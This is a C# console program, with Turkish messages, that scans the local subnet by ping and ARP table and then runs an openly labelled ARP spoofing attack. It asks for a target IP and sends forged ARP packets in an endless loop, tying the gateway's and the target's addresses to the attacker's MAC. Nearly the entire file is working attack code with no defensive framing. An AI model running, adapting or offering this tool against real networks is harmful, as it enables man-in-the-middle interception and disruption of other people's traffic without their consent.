using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using SharpPcap;
using PacketDotNet;
using SharpPcap.LibPcap;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

class Program

{
    static void Main(string[] args)
    {


        //    interfaces
        var selectedDevice = SelectNetworkInterface();
        if (selectedDevice == null)
        {
            Console.WriteLine("gecerli bir ag arayuzu secilmedi");
            return;
        }

        //    network inteface get ip  
        var localIp = GetLocalIpAddress(selectedDevice);
        if (localIp == null)
        {
            Console.WriteLine("secilen ag arayuzunde bir IP adresi bulunamadı ");
            return;
        }

        Console.WriteLine($"islem yapilan ag arayüzü: {selectedDevice.Description}");
        Console.WriteLine($"local IP adresi: {localIp}");

        //   cihazları tara
        Console.WriteLine("\nAğdaki cihazlar taranıyor...");
        ScanNetwork(localIp);


        var gatewayIpString = GetDefaultGateway().ToString();
        IPAddress gatewayIp;
        if (!IPAddress.TryParse(gatewayIpString, out gatewayIp))
        {
            Console.WriteLine("Geçersiz IP adresi ");
            return;
        }

        // ARP attack  ip
        Console.Write("\nARP  attack yapılacak IP adresi: ");
        string targetIp = Console.ReadLine();
        IPAddress targetIpAddress;
        if (!IPAddress.TryParse(targetIp, out targetIpAddress))
        {
            Console.WriteLine("Geçersiz IP adresi ");
            return;
        }

        // ARP attack start
        Console.WriteLine($"\n{targetIp} adresine ARP basliyor...");
        StartArpSpoofing(selectedDevice, gatewayIp, targetIpAddress);
    }

    static LibPcapLiveDevice SelectNetworkInterface()
    {
        var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
        var activeInterface = networkInterfaces
            .Where(ni => ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .OrderByDescending(ni => ni.GetIPStatistics().BytesReceived + ni.GetIPStatistics().BytesSent)
            .FirstOrDefault();

        if (activeInterface != null)
        {

            var devices = LibPcapLiveDeviceList.Instance;


            var selectedDevice = devices.FirstOrDefault(d => d.Description == activeInterface.Description);

            return selectedDevice;
        }

        return null;





    }
    public static IPAddress GetDefaultGateway()
    {
        var gatewayAddress = NetworkInterface.GetAllNetworkInterfaces()
            .Where(e => e.OperationalStatus == OperationalStatus.Up)
            .SelectMany(e => e.GetIPProperties().GatewayAddresses)
            .Where(g => g.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) //    sadece IPv4
            .Select(g => g.Address)
            .FirstOrDefault();

        return gatewayAddress;
    }
    static IPAddress GetLocalIpAddress(LibPcapLiveDevice device)
    {
        foreach (var address in device.Addresses)
        {
            if (address.Addr.type == SharpPcap.LibPcap.Sockaddr.AddressTypes.AF_INET_AF_INET6)
            {
                return address.Addr.ipAddress;
            }
        }
        return null;
    }


    static void ScanNetwork(IPAddress localIp)
    {
        string[] ipParts = localIp.ToString().Split('.');
        string networkPrefix = $"{ipParts[0]}.{ipParts[1]}.{ipParts[2]}.";

        ConcurrentBag<string> activeIps = new ConcurrentBag<string>();

        Parallel.For(1, 255, i =>
        {
            string ip = networkPrefix + i;
            Ping ping = new Ping();
            PingReply reply = ping.Send(ip, 500);
            if (reply.Status == IPStatus.Success)
            {
                activeIps.Add(ip);
                Console.WriteLine($"Aktif cihaz bulundu: {ip}");
            }
        });
        HashSet<string> allIps = new HashSet<string>(activeIps);
        // Retrieve devices that do not respond to ping
        foreach (var ip in GetArpTable())
        {
            if (ip.StartsWith(networkPrefix) && !activeIps.Contains(ip))
            {
                allIps.Add(ip);
                Console.WriteLine($"Ping e yanıt vermeyen aktif cihaz bulundu: {ip}");
            }
        }
        Console.WriteLine($"Bulunan cihaz sayisi {allIps.Count}");
    }



    // get ARP tbl 
    private static List<string> GetArpTable()
    {
        List<string> arpTable = new List<string>();
        Process p = new Process();
        p.StartInfo.FileName = "arp";
        p.StartInfo.Arguments = "-a";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.CreateNoWindow = true;
        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();

        string[] lines = output.Split(new char[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

        foreach (string line in lines)
        {
            if (line.Contains("dynamic") || line.Contains("static"))
            {
                string[] parts = line.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length >= 2)
                {
                    IPAddress ip;
                    if (IPAddress.TryParse(parts[0], out ip))
                    {
                        arpTable.Add(ip.ToString());
                    }
                }
            }
        }

        return arpTable;
    }

    static void SendArpPacket(LibPcapLiveDevice device, PhysicalAddress sourceMac, IPAddress sourceIp, IPAddress destinationIp)
    {
        // create  Broadcast adress  
        PhysicalAddress broadcastMac = PhysicalAddress.Parse("FFFFFFFFFFFF");

        // ARP packet 
        EthernetPacket ethernetPacket = new EthernetPacket(sourceMac, broadcastMac, EthernetType.Arp);
        ArpPacket arpPacket = new ArpPacket(ArpOperation.Request, broadcastMac, destinationIp, sourceMac, sourceIp);
        ethernetPacket.PayloadPacket = arpPacket;

        // paket send
        device.SendPacket(ethernetPacket.Bytes);
        Console.WriteLine($"ARP paketi gonderiliyor: {sourceIp} -> {destinationIp}");
    }

    static void StartArpSpoofing(LibPcapLiveDevice device, IPAddress gatewayIp, IPAddress targetIpAddress)
    {

        if (gatewayIp == null || targetIpAddress == null)
        {
            throw new ArgumentOutOfRangeException(nameof(gatewayIp), "IP adresleri geçersiz olamaz");
        }

        try
        {
            device.Open();
            PhysicalAddress attackerMac = device.MacAddress;

            Console.WriteLine($"hedef MAC: {attackerMac}");
            Console.WriteLine($"Gateway IP: {gatewayIp}");
            Console.WriteLine($"hedef IP: {targetIpAddress}");

            while (true)
            {

                SendArpPacket(device, attackerMac, gatewayIp, targetIpAddress);

                SendArpPacket(device, attackerMac, targetIpAddress, gatewayIp);


            }
        }
        catch (ArgumentOutOfRangeException ex)
        {
            Console.WriteLine($"{ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"ARP atagi sırasında hata : {ex.Message}");
        }
        finally
        {
            device.Close();
        }
    }
}

